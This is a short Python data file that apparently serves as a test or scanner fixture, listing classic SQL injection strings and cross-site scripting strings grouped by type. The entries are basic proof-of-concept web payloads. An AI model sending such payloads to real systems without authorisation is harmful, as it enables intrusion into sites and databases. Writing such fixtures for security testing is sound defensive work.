SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<iframe src=javascript:alert(1)></iframe>",
]

PAYLOADS = [
    {"type": "sqli", "items": SQLI_PAYLOADS},
    {"type": "xss", "items": XSS_PAYLOADS},
]
